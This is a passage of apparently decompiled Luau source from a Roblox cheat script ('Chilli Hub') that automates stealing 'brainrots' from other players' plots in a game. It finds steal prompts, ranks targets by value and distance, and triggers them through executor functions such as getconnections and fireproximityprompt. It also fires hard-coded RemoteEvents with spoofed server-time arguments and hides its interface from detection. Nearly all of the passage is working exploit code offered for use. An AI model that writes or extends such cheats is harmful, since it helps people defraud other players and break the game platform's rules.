										if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
											v17 = descendant
											break
										else
											v17 = nil
										end
									end

									if v17 then
										local str3 = tostring(v17.ObjectText or "")

										tbl6[#tbl6 + 1] = {
											Prompt = v17,
											Plot = child,
											Spawn = base,
											Name = str3,
											Generation = fn26(base, child, str3, tbl7),
										}
									end
								end
							end
						end
					end

					tbl3 = tbl6
				end
			end

			local n10
			n10 = 0.03
			local n11
			n11 = -math.huge
			local v16
			v16 = nil
			local v17
			v17 = nil
			local v18
			v18 = nil
			local v19
			v19 = nil
			local v20
			v20 = nil
			local v21
			v21 = nil
			local fn25

			fn25 = function(arg, arg2, distance, generation)
				local tbl6 = { Prompt = arg.Prompt, Plot = arg.Plot, Position = arg2 }
				local name = arg.Name
				local name2

				if name then
					name2 = name
				else
					name2 = tostring(arg.Prompt.ObjectText or "")
				end

				tbl6.Name = name2
				tbl6.Generation = generation
				tbl6.Distance = distance
				return tbl6
			end

			prompt2 = nil

			fn10 = function(arg)
				if not arg then
					return nil
				end

				for _, v22 in ipairs(tbl3) do
					if v22.Prompt == arg then
						return v22
					end
				end

				return nil
			end

			fn11 = function(arg)
				if not (prompt2 and prompt2.Parent and arg) then
					return nil
				end
				local v22 = fn10(prompt2)
				if not v22 then
					return nil
				end
				local position = v22.Spawn.Position
				return fn25(v22, position, (arg.Position - position).Magnitude, v22.Generation or 0)
			end

			fn12 = function(arg, arg2, arg3, arg4)
				if flag4 then
					arg2 = arg4 or arg2
					if arg2 and arg2.Distance <= n3 then
						return arg2
					end
					return nil
				end

				local v22 = fn11(arg)
				if v22 then
					return v22
				end
				return arg3
			end

			str2 = "Default (Chilli Hub)"
			fn13 = nil
			fn14 = nil
			screenGui = Instance.new("ScreenGui")
			screenGui.Name = "ChilliMacLibTargetGui"
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Enabled = false

			pcall(function()
				screenGui.Parent = type(gethui) == "function" and gethui() or CoreGui
			end)

			do
				local frame3 = Instance.new("Frame")
				frame3.Name = "TargetCard"
				frame3.AnchorPoint = Vector2.new(0.5, 0)
				frame3.Position = UDim2.new(0.5, 0, 0, 72)
				frame3.Size = UDim2.fromOffset(270, 48)
				frame3.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
				frame3.BackgroundTransparency = 0.15
				frame3.BorderSizePixel = 0
				frame3.Parent = screenGui
				Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(58, 255, 55)
				uiStroke.Thickness = 1.2
				uiStroke.Transparency = 0.3
				uiStroke.Parent = frame3
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1
				textLabel3.Position = UDim2.fromOffset(12, 5)
				textLabel3.Size = UDim2.new(1, -24, 0, 14)
				textLabel3.Font = Enum.Font.GothamBold
				textLabel3.TextSize = 11
				textLabel3.TextColor3 = Color3.fromRGB(58, 255, 55)
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				textLabel3.Text = "AUTO STEAL (MAC LIB) - MỤC TIÊU GẦN NHẤT"
				textLabel3.Parent = frame3
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1
				textLabel4.Position = UDim2.fromOffset(12, 22)
				textLabel4.Size = UDim2.new(1, -24, 0, 20)
				textLabel4.Font = Enum.Font.GothamBlack
				textLabel4.TextSize = 13
				textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
				textLabel4.Parent = frame3
				local flag8 = false
				local v22 = nil
				local vector2 = Vector2.new(0, 0)
				local position = nil

				fn4(frame3.InputBegan:Connect(function(input)
					local v23 = flag8
					local flag9

					if flag8 then
						flag9 = v23
					else
						flag9 = input.UserInputState ~= Enum.UserInputState.Begin
					end

					if flag9 then
						return
					end
					local flag10 = input.UserInputType == Enum.UserInputType.Touch
					if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag10 then
						return
					end
					local vector22 = Vector2.new(input.Position.X, input.Position.Y)
					if not fn21(frame3, vector22) then
						return
					end
					flag8 = true
					v22 = flag10 and input or nil
					vector2 = vector22
					position = frame3.Position
				end))

				fn4(UserInputService2.InputChanged:Connect(function(input)
					if not flag8 or not position then
						return
					end

					if v22 and input == v22 or not v22 and input.UserInputType == Enum.UserInputType.MouseMovement then
						local n12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
						frame3.Position = UDim2.new(position.X.Scale, position.X.Offset + n12.X, position.Y.Scale, position.Y.Offset + n12.Y)
					end
				end))

				fn4(UserInputService2.InputEnded:Connect(function(input)
					if not flag8 then
						return
					end

					if v22 and input == v22 or not v22 and input.UserInputType == Enum.UserInputType.MouseButton1 then
						flag8 = false
						v22 = nil
						position = nil
					end
				end))

				fn15 = function(arg)
					if not screenGui.Parent then
						return
					end

					if not (str2 and string.find(str2, "Mac")) then
						screenGui.Enabled = false
						return
					end
					screenGui.Enabled = true

					if arg and arg.Name then
						local str3 = arg.Distance and string.format("%.1fm", arg.Distance) or ""
						local str4 = arg.Generation and arg.Generation > 0 and " | " .. fn8(arg.Generation) or ""
						textLabel4.Text = string.format("%s (%s)%s", tostring(arg.Name), str3, str4)
					else
						textLabel4.Text = "Đang quét tìm brainrot gần nhất..."
					end
				end
			end

			fn16 = function(arg)
				fn15(arg)
			end

			do
				local function fn26(arg)
					local match, v22 = tostring(arg or ""):match("%$?([%d%.]+)%s*([KMB]?)")
					if not match then
						return 0
					end
					local n12 = tonumber(match) or 0

					if v22 == "K" then
						n12 *= 1000
					elseif v22 == "M" then
						n12 *= 1000000
					elseif v22 == "B" then
						n12 *= 1e9
					end

					return n12
				end

				local function fn27()
					local name = localPlayer.Name
					local displayName = localPlayer.DisplayName
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						return nil
					end

					for _, child in ipairs(plots:GetChildren()) do
						local plotSign = child:FindFirstChild("PlotSign")

						if plotSign then
							local surfaceGui = plotSign:FindFirstChild("SurfaceGui")

							if surfaceGui then
								local frame3 = surfaceGui:FindFirstChild("Frame")

								if frame3 then
									local textLabel3 = frame3:FindFirstChildOfClass("TextLabel")

									if textLabel3 and type(textLabel3.Text) == "string" then
										local text = textLabel3.Text
										if string.find(text, displayName, 1, true) or string.find(text, name, 1, true) then
											return child
										end
										continue
									end

									continue
								end
							end
						end
					end

					return nil
				end

				local function fn28(arg)
					if not (arg and arg:IsA("Model")) then
						return nil
					end

					for _, descendant in ipairs(arg:GetDescendants()) do
						if descendant:IsA("TextLabel") then
							local v22 = string.lower(descendant.Name)
							if v22 == "generation" or v22 == "gen" or v22:find("generation") or v22:find("gen") then
								return descendant
							end
						end
					end

					return nil
				end

				fn17 = function(arg)
					if not arg then
						return nil, nil, 0
					end
					local position = arg.Position
					local v22 = nil
					local v23 = nil
					local n12 = -math.huge
					local huge = math.huge
					local n13 = 0

					local function fn29(arg2, arg3, arg4, arg5)
						if not (arg2 and arg2.Parent) then
							return
						end

						if tostring(arg2.ActionText) ~= str then
							return
						end

						if fn7(arg2) then
							return
						end

						if not arg4 then
							arg4 = tostring(arg2.ObjectText or "")
						end

						if type(arg5) ~= "number" then
							local flag8 = type(arg5) == "string" and arg5 ~= ""
							local n14 = 0

							if flag8 then
								arg5 = fn26(arg5)
							else
								arg5 = n14
							end
						end

						if arg5 == 0 then
							arg5 = fn24(arg4)
						end

						if n2 and n2 > 1000 and arg5 > 0 and arg5 < n2 then
							return
						end
						n13 += 1
						local magnitude = (position - arg3).Magnitude

						if magnitude <= n3 then
							local tbl6 = {
								Prompt = arg2,
								Spawn = { Position = arg3 },
								Position = arg3,
								Name = arg4,
								Generation = arg5,
								Distance = magnitude,
							}

							if not v22 or arg5 > n12 then
								v22 = tbl6
								n12 = arg5
							end

							if not v23 or magnitude < huge then
								v23 = tbl6
								huge = magnitude
							end
						end
					end

					local plots = Workspace:FindFirstChild("Plots")
					local n14 = 0

					if n9 then
						n14 = os.clock() < n9
					end

					if plots and not n14 then
						local v24 = fn27()

						for _, child in ipairs(plots:GetChildren()) do
							if child ~= v24 then
								local animalPodiums = child:FindFirstChild("AnimalPodiums")

								if animalPodiums then
									for _, child2 in ipairs(animalPodiums:GetChildren()) do
										local base = child2:FindFirstChild("Base")
										local spawn = base and base:FindFirstChild("Spawn")

										if spawn and spawn:IsA("BasePart") then
											local promptAttachment = spawn:FindFirstChild("PromptAttachment") or spawn
											local v25 = nil

											for _, descendant in ipairs(promptAttachment:GetDescendants()) do
												if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
													v25 = descendant
													break
												else
													v25 = nil
												end
											end

											if v25 then
												local str3 = tostring(v25.ObjectText or "")
												local attachment = spawn:FindFirstChild("Attachment")
												attachment = attachment and attachment:FindFirstChild("AnimalOverhead")
												local str4 = ""

												if attachment then
													local generation = attachment:FindFirstChild("Generation")

													if generation and generation:IsA("TextLabel") then
														str4 = generation.Text
													end
												end

												if str4 == "" and str3 ~= "" then
													local v26 = child:FindFirstChild(str3) or child:FindFirstChild(str3, true)

													if v26 and v26:IsA("Model") then
														local v27 = fn28(v26)

														if v27 then
															str4 = v27.Text
														end
													end
												end

												fn29(v25, spawn.Position, str3, str4, child.Name, tostring(i))
											end
										end
									end
								end
							end
						end
					end

					local debris = Workspace:FindFirstChild("Debris")

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							local v24 = string.lower(child.Name or "")

							if v24 ~= "lucky block" and v24 ~= "camera" and not child:IsA("Camera") then
								local v25 = nil

								for _, descendant in ipairs(child:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
										v25 = descendant
										break
									else
										v25 = nil
									end
								end

								if v25 then
									local position2 = child:IsA("BasePart") and child.Position or child:IsA("Model") and child.PrimaryPart and child.PrimaryPart.Position or v25.Parent and v25.Parent:IsA("BasePart") and v25.Parent.Position

									if position2 then
										local str3 = ""

										if child:IsA("Model") then
											local v26 = fn28(child)

											if v26 then
												str3 = v26.Text
											end
										end

										fn29(v25, position2, tostring(v25.ObjectText or child.Name), str3, nil, nil)
									end
								end
							end
						end
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player.Character then
							local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart then
								for _, descendant in ipairs(player.Character:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
										fn29(descendant, humanoidRootPart.Position, tostring(descendant.ObjectText or "Carried Brainrot"), "", nil, nil)
									end
								end
							end
						end
					end

					return v22, v23, n13
				end
			end

			fn18 = function(arg)
				if not arg then
					return nil, nil, nil, nil, 0
				end
				local now = os.clock()
				local position = arg.Position
				if now - n11 < n10 and v16 and (position - v16).Magnitude < 0.5 then
					return v17, v18, v19, v20, v21
				end
				fn9(false)
				local n12 = 0
				local v22 = nil
				local v23 = nil
				local v24 = nil
				local v25 = nil
				local v26 = nil
				local v27 = nil
				local v28 = nil
				local v29 = nil

				for _, v30 in ipairs(tbl3) do
					local prompt3 = v30.Prompt

					if prompt3.Parent and prompt3.Enabled and tostring(prompt3.ActionText) == str and not fn7(prompt3) then
						local generation = v30.Generation or 0
						local v31 = flag4
						local flag8

						if flag4 then
							flag8 = v31
						else
							flag8 = generation >= n2
						end

						if flag8 then
							n12 += 1
							local position2 = v30.Spawn.Position
							local magnitude = (position - position2).Magnitude

							if not v22 or generation > v23 then
								v22 = fn25(v30, position2, magnitude, generation)
								v23 = generation
							end

							if not v24 or magnitude < v25 then
								v24 = fn25(v30, position2, magnitude, generation)
								v25 = magnitude
							end

							if magnitude <= n3 then
								if not v26 or generation > v27 then
									v26 = fn25(v30, position2, magnitude, generation)
									v27 = generation
								end

								if not v28 or magnitude < v29 then
									v28 = fn25(v30, position2, magnitude, generation)
									v29 = magnitude
								end
							end
						end
					end
				end

				n11 = now
				v16 = position
				v17 = v26
				v18 = v28
				v19 = v22
				v20 = v24
				v21 = n12
				return v26, v28, v22, v24, n12
			end

			fn19 = function(arg)
				if not arg or not arg:IsA("ProximityPrompt") or not arg.Parent or type(getconnections) ~= "function" then
					return nil
				end
				local tbl6 = {}
				local tbl7 = {}

				if not pcall(function()
					for _, v22 in pairs(getconnections(arg.PromptButtonHoldBegan)) do
						if v22 and v22.Function then
							tbl6[#tbl6 + 1] = v22.Function
						end
					end

					for _, v22 in pairs(getconnections(arg.Triggered)) do
						if v22 and v22.Function then
							tbl7[#tbl7 + 1] = v22.Function
						end
					end
				end) or #tbl7 == 0 then
					return nil
				end

				return tbl6, tbl7
			end

			do
				local v22 = CoreGui

				pcall(function()
					if type(gethui) == "function" then
						local hui = gethui()

						if typeof(hui) == "Instance" then
							v22 = hui
						end
					end
				end)

				local chilliAutoGetBarGui = v22:FindFirstChild("ChilliAutoGetBarGui")

				if chilliAutoGetBarGui then
					pcall(function()
						chilliAutoGetBarGui:Destroy()
					end)
				end

				screenGui2 = Instance.new("ScreenGui")
				screenGui2.Name = "ChilliAutoGetBarGui"
				screenGui2.ResetOnSpawn = false
				screenGui2.IgnoreGuiInset = true
				screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				screenGui2.Enabled = false
				screenGui2.Parent = v22
			end

			local color
			color = Color3.fromRGB(58, 255, 55)
			local color2
			color2 = Color3.fromRGB(20, 109, 0)
			local createUIGradient

			do
				local gothamBold = Enum.Font.GothamBold

				pcall(function()
					gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
				end)

				local function fn26(arg)
					if typeof(gothamBold) == "Font" then
						arg.FontFace = gothamBold
					else
						arg.Font = Enum.Font.GothamBold
					end
				end

				createUIGradient = function(parent, arg, arg2)
					local uiGradient = Instance.new("UIGradient")
					local new = ColorSequenceKeypoint.new
					uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, arg), new(1, arg2) })
					uiGradient.Rotation = 90
					uiGradient.Parent = parent
					return uiGradient
				end

				frame = Instance.new("Frame")
				frame.Name = "Holder"
				frame.AnchorPoint = Vector2.new(0.5, 0)
				frame.Position = UDim2.new(0.5, 0, 0, 10)
				frame.Size = UDim2.fromOffset(248, 46)
				frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
				frame.BackgroundTransparency = 0.28
				frame.BorderSizePixel = 0
				frame.Parent = screenGui2
				Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.93
				uiStroke.Parent = frame
				local n12 = 0.125
				local n13 = 248
				local n14 = 1
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame

				local function fn27()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * n12 * n14 / n13, 0.6, 1.4)
				end

				fn27()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					fn4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn27))
				end

				fn4(Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn27))
				textLabel = Instance.new("TextLabel")
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.fromOffset(14, 8)
				textLabel.Size = UDim2.new(1, -104, 0, 15)
				textLabel.TextSize = 13
				textLabel.TextScaled = true
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextTruncate = Enum.TextTruncate.None
				textLabel.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel.Text = ""
				fn26(textLabel)
				textLabel.Parent = frame
				local uiTextSizeConstraint = Instance.new("UITextSizeConstraint")
				uiTextSizeConstraint.MinTextSize = 8
				uiTextSizeConstraint.MaxTextSize = 13
				uiTextSizeConstraint.Parent = textLabel
				chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel)
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(1, 0)
				textLabel2.Position = UDim2.new(1, -14, 0, 8)
				textLabel2.Size = UDim2.fromOffset(88, 15)
				textLabel2.TextSize = 13
				textLabel2.TextXAlignment = Enum.TextXAlignment.Right
				textLabel2.TextColor3 = color
				textLabel2.Text = ""
				fn26(textLabel2)
			end

			textLabel2.Parent = frame
			local frame3 = Instance.new("Frame")
			frame3.Position = UDim2.fromOffset(14, 30)
			frame3.Size = UDim2.new(1, -28, 0, 6)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.88
			frame3.BorderSizePixel = 0
			frame3.Parent = frame
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(0, 0, 1, 0)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame2.BorderSizePixel = 0
			frame2.Parent = frame3
			Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
			createUIGradient(frame2, color, color2)
		end

		local frame3, visible, flag8, n8, n9, n10, n11, fn20, fn21, v13
		local fn22, fn23, fn24

		do
			local frame4 = Instance.new("Frame")
			frame4.Position = UDim2.fromOffset(14, 41)
			frame4.Size = UDim2.new(1, -28, 0, 4)
			frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame4.BackgroundTransparency = 0.9
			frame4.BorderSizePixel = 0
			frame4.Visible = false
			frame4.Parent = frame
			Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
			frame3 = Instance.new("Frame")
			frame3.Size = UDim2.new(0, 0, 1, 0)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.55
			frame3.BorderSizePixel = 0
			frame3.Parent = frame4
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			visible = false
			flag8 = false
			n8 = 0
			n9 = 1
			n10 = 0
			n11 = 0

			fn20 = function()
				flag8 = false
			end

			fn21 = function(arg)
				if not flag5 or not screenGui2.Parent then
					flag8 = false
					return
				end
				n9 = math.max(tonumber(arg) or 1, 0.01)
				n8 = os.clock()
				flag8 = true
			end

			local n12 = 0.22
			local n13 = 10
			local color = Color3.fromRGB(255, 255, 255)
			v13 = nil
			local v14 = nil
			local radius = 0

			fn22 = function()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if v14 then
					pcall(function()
						v14:Destroy()
					end)

					v14 = nil
				end

				if v13 then
					pcall(function()
						v13:Destroy()
					end)

					v13 = nil
				end

				radius = 0
			end

			local function fn25()
				if v13 and v13.Parent and v14 then
					return
				end
				fn22()
				local part = Instance.new("Part")
				part.Name = fn()
				part.Anchored = true
				part.CanCollide = false
				part.CanQuery = false
				part.CanTouch = false
				part.CastShadow = false
				part.Massless = true
				part.Size = Vector3.one
				part.Transparency = 1
				part.Parent = Workspace
				local cylinderHandleAdornment = Instance.new("CylinderHandleAdornment")
				cylinderHandleAdornment.Name = fn()
				cylinderHandleAdornment.Adornee = part
				cylinderHandleAdornment.AlwaysOnTop = true
				cylinderHandleAdornment.Color3 = color
				cylinderHandleAdornment.Height = 0.05
				cylinderHandleAdornment.InnerRadius = 0
				cylinderHandleAdornment.Radius = 0
				cylinderHandleAdornment.Transparency = 0.25
				cylinderHandleAdornment.ZIndex = 1
				cylinderHandleAdornment.Parent = part
				v13 = part
				v14 = cylinderHandleAdornment
			end

			fn23 = function(arg)
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

				if not visible or not character_ then
					if v13 then
						fn22()
					end

					return
				end

				fn25()
				local n14 = math.max(tonumber(n3) or 20, 1)
				local n15 = math.min(arg or 0.016, 0.1)

				if radius <= 0 then
					radius = n14
				else
					radius += (n14 - radius) * (1 - math.exp(-n15 * n13))
				end

				v13.CFrame = CFrame.new(character_.Position - Vector3.new(0, 2.9, 0)) * CFrame.Angles(-1.5707963267948966, 0, 0)
				v14.Radius = radius
				v14.InnerRadius = math.max(radius - n12, 0)
			end

			fn24 = function(arg)
				visible = arg == true
				frame4.Visible = visible
				frame.Size = UDim2.fromOffset(248, visible and 55 or 46)

				if not visible then
					n11 = 0
					frame3.Size = UDim2.new(0, 0, 1, 0)
					fn22()
				end
			end
		end

		local fn25

		fn25 = function(arg, arg2, arg3)
			if textLabel.Parent then
				textLabel.Text = tostring(arg or "")
				chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle, arg3)
			end

			if textLabel2.Parent then
				textLabel2.Text = tostring(arg2 or "")
			end
		end

		do
			local flag9 = false
			local v14 = nil
			local vector2 = Vector2.new(0, 0)
			local position = nil

			fn4(frame.InputBegan:Connect(function(input)
				if flag9 or input.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
				local flag10 = input.UserInputType == Enum.UserInputType.Touch
				if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag10 then
					return
				end
				local vector22 = Vector2.new(input.Position.X, input.Position.Y)
				local absolutePosition = frame.AbsolutePosition
				local absoluteSize = frame.AbsoluteSize
				if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
					return
				end
				flag9 = true
				v14 = flag10 and input or nil
				vector2 = vector22
				position = frame.Position
			end))

			fn4(UserInputService2.InputChanged:Connect(function(input)
				if not flag9 then
					return
				end

				if not (v14 and input == v14 or not v14 and input.UserInputType == Enum.UserInputType.MouseMovement) or not position then
					return
				end
				local n12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
				frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n12.X, position.Y.Scale, position.Y.Offset + n12.Y)
			end))

			fn4(UserInputService2.InputEnded:Connect(function(input)
				if not flag9 then
					return
				end
				local flag10 = v14 and input == v14
				local flag11

				if flag10 then
					flag11 = flag10
				else
					flag11 = not v14 and input.UserInputType == Enum.UserInputType.MouseButton1
				end

				if flag11 then
					flag9 = false
					v14 = nil
					position = nil
				end
			end))
		end

		local fn26

		fn26 = function()
			if screenGui2.Parent then
				screenGui2.Enabled = flag3 and flag5
			end

			if not flag3 or not flag5 then
				fn20()
				fn25("", "")
			end
		end

		do
			local n12 = 1
			local n13 = 0.25
			local n14 = -math.huge
			local n15 = -math.huge

			local function fn27()
				if not flag3 then
					return
				end
				local now = os.clock()
				if now - n14 < n12 then
					return
				end
				n14 = now

				task.spawn(function()
					fn14()
					task.wait(0.05)
					fn13()
				end)
			end

			local function fn28(arg)
				local now = os.clock()
				if now - n15 < n13 then
					return
				end
				n15 = now

				for _, v14 in ipairs(arg) do
					pcall(v14)
				end
			end

			local function fn29(arg)
				if not (arg and arg.Parent) or type(getconnections) ~= "function" then
					return
				end

				pcall(function()
					for _, v14 in pairs(getconnections(arg.PromptButtonHoldEnded)) do
						if v14 and v14.Function then
							pcall(v14.Function)
						end
					end
				end)
			end

			local function fn30(arg, arg2, arg3, arg4, arg5)
				local prompt3 = type(arg) == "table" and arg.Prompt or arg
				local plotName = type(arg) == "table" and arg.PlotName or nil
				local slotName = type(arg) == "table" and arg.SlotName or nil
				if not prompt3 then
					return false, "no prompt"
				end

				if str2 == "Fix 1 (Wait Before Fire)" then
					task.wait(0.1)
				end

				local n16 = os.clock() - n6
				local n17 = 0

				if str2 == "Fix 2 (Longer Settle)" then
					n17 = 1.5
				end

				if n16 < n17 then
					task.wait(n17 - n16)
				end

				if not flag2 or not flag3 or arg2 ~= n5 then
					return false, "stopped"
				end
				local v14, v15 = fn19(prompt3)
				if not v14 or not v15 then
					return false, "no handlers"
				end
				local n18 = 1.3

				if flag6 then
					flag6 = false
					n18 = 2
				end

				if arg4 then
					pcall(arg4, n18)
				end

				if str2 == "Xen Hub Source v11" then
					if plotName and slotName then
						local function fn31()
							pcall(function()
								local reB096e1ca9c3a453b8b60268b235083 = game:GetService("ReplicatedStorage").Packages.Net["RE/b096e1ca-9c3a-453b-8b60-268b235083b9"]
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "5c0bd012-dfb2-4bac-8f1a-e41f136e4744")
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "6be28b5b-dbc3-4aab-aa0c-6ebcfa191f22")
							end)
						end

						local function fn32(arg6, arg7)
							pcall(function()
								game:GetService("ReplicatedStorage").Packages.Net["RE/5aa39ea1-0c65-4fcf-aff9-b18a7ef277c3"]:FireServer(Workspace:GetServerTimeNow() + 67, "c262398d-68e3-4499-8bea-99766bf11686", arg6, tonumber(arg7) or arg7)
								local v16
								v16:FireServer(Workspace:GetServerTimeNow() + 67, "579e6c26-5a80-407d-9488-0f84752e8f1f", arg6, tonumber(arg7) or arg7)
							end)
						end

						fn31()
						task.wait(1.3)
						fn32(plotName, slotName)
						return true, "fired xen hub source"
					end

					for _, v16 in ipairs(v14) do
						pcall(v16)
					end

					task.wait(1.3)

					for _, v16 in ipairs(v15) do
						pcall(v16)
					end

					return true, "fired fallback"
				end

				if str2 and string.find(str2, "v20") and localPlayer:GetAttribute("Stealing") == true then
					return false, "v20_radar"
				end

				if str2 and string.find(str2, "v21") then
					local now = os.clock()

					while not prompt3.Enabled and prompt3.Parent and os.clock() - now < 0.6 do
						task.wait(0.02)
					end
				end

				if os.clock() - n6 < 1.5 and str2 and (string.find(str2, "Smart Window") or string.find(str2, "v19") or string.find(str2, "v19")) then
					for _, v16 in ipairs(v14) do
						pcall(v16)
					end

					task.wait(n18)

					for _, v16 in ipairs(v15) do
						pcall(v16)
					end

					n6 = os.clock()
					return true, "fired (v14 protected window)"
				end

				local flag9 = str2 and string.find(str2, "v23")

				if flag9 then
					local v16 = globalCacheLockUntil
					flag9 = os.clock() < v16
				end

				if (isDebris or flag9) and str2 and string.find(str2, "v22") then
					for _, v16 in ipairs(v14) do
						pcall(v16)
					end

					task.wait(n18)

					for _, v16 in ipairs(v15) do
						pcall(v16)
					end

					fn29(prompt3)
					n6 = os.clock()
					return true, "fired (v22 debris cache hold)"
				end

				if str2 == "Fix 4 (FireProximityPrompt)" then
					if fireproximityprompt then
						fireproximityprompt(prompt3, 0)
						fireproximityprompt(prompt3, 1)
					end
				end

				for _, v16 in ipairs(v14) do
					pcall(v16)
				end

				local str3 = tostring(prompt3.ObjectText)
				local now = os.clock()

				while os.clock() - now < n18 do
					task.wait(0.05)
					if not flag2 or not flag3 or arg2 ~= n5 then
						fn29(prompt3)
						return false, "stopped"
					end

					if not arg5 and localPlayer:GetAttribute("Stealing") == true then
						for _, v16 in ipairs(v15) do
							pcall(v16)
						end

						fn29(prompt3)
						return false, "carrying"
					end

					if tostring(prompt3.ObjectText) ~= str3 then
						fn28(v15)
						fn27()
						fn29(prompt3)
						return false, "brainrot changed"
					end

					if not prompt3.Parent or not prompt3.Enabled or not arg3() then
						fn28(v15)
						fn27()
						fn29(prompt3)
						return false, "retargeted"
					end
				end

				local v16

				if str2 == "Default (Chilli Hub)" or str2 == "Fix 3 (Re-fetch Triggers)" then
					local v17
					v17, v16 = fn19(prompt3)
					v16 = v16 or v15
				else
					v16 = v15
				end

				for _, v17 in ipairs(v16) do
					pcall(v17)
				end

				fn29(prompt3)
				n6 = os.clock()
				return true, "fired"
			end

			local function fn31(arg, arg2, arg3)
				if not flag2 or not flag3 or arg2 ~= n5 then
					return false
				end

				if arg3 and localPlayer:GetAttribute("Stealing") ~= true then
					return false
				end
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return false
				end

				if flag4 then
					local prompt3 = arg.Prompt
					if not prompt3 or not prompt3.Parent or not prompt3.Enabled or tostring(prompt3.ActionText) ~= str or fn7(prompt3) then
						return false
					end
					local position = arg.Position
					return not position or (humanoidRootPart.Position - position).Magnitude <= n3
				end

				if prompt2 and prompt2.Parent then
					return arg.Prompt == prompt2
				end
				local v14

				if str2 and (string.find(str2, "Mac Lib") or string.find(str2, "Original")) then
					local v15
					v15, v14 = fn17(humanoidRootPart)
				else
					local v15
					v15, v14 = fn18(humanoidRootPart)
				end

				if not v14 then
					return false
				end

				if v14.Prompt == arg.Prompt then
					return true
				end
				return v14.Distance >= (humanoidRootPart.Position - arg.Position).Magnitude - n
			end

			local function fn32(arg)
				local v14 = prompt
				local parent = prompt

				if v14 then
					parent = v14.Parent
				end

				if parent then
					local now = os.clock()

					while flag2 and flag3 and arg == n5 and os.clock() - now < 1 do
						if v14.Enabled and tostring(v14.ActionText) == str then
							return
						end
						task.wait(0.05)
					end
				else
					task.wait(0.2)
				end
			end

			local function fn33(arg)
				local flag9 = false

				while true do
					if flag2 and flag3 and arg == n5 then
						local flag10 = localPlayer:GetAttribute("Stealing") == true

						if not flag9 then
							if str2 and string.find(str2, "v19") then
								task.wait()
							else
								task.wait(0.1)
							end
						end

						local flag11 = not flag2 or not flag3 or arg ~= n5
						flag9 = false

						if not flag11 then
							if not (str2 and string.find(str2, "v20")) and localPlayer:GetAttribute("Stealing") == true then
								flag7 = true
								fn20()

								if flag5 then
									fn25("GET READY - carrying brainrot", "")
								end

